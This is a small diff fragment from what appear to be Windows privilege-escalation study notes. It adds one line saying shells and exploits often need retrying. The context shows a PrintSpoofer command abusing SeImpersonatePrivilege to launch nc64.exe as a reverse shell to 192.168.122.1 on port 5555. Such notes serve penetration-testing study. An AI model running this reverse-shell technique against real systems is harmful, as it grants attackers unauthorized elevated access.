@@ -261,6 +261,7 @@ C:\Users\user\Desktop>cscript C:\PrivEsc\CreateShortcut.vbs
 ```
 
 ## ⭐⭐Permissions⭐⭐
+Must try many times - sometimes shell dont work, exploit dont work etc
 ```
 🔺 SeImpersonatePrivilege
 ./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
